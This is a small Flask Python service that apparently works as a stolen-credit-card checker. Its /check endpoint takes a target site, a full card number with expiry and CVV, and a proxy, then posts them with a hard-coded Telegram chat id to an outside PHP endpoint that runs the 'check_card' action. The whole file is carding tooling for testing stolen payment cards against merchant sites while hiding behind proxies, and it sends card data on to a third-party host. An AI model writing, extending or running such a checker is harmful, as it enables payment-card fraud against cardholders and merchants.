from flask import Flask, request
import requests, json

app = Flask(__name__)

TARGET_URL = "https://rohitvishal.dev/loda.php"

@app.route("/check", methods=["GET"])
def check_card():
    site = request.args.get("site")
    cc   = request.args.get("cc")
    proxy = request.args.get("proxy")

    if not site or not cc or not proxy:
        return "MISSING_PARAMS"

    payload = {
        "action": "check_card", 
        "site": site,
        "cc": cc,
        "proxy": proxy,
        "telegram_chat_id": "7254736651"
    }

    try:
        response = requests.post(TARGET_URL, json=payload, timeout=30)
        return response.text if response.status_code == 200 else "API_ERROR"
    except:
        return "REQUEST_FAILED"

@app.route("/")
def home():
    return "API Running - Use /check?site=X&cc=card|mm|yy|cvv&proxy=host:port"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)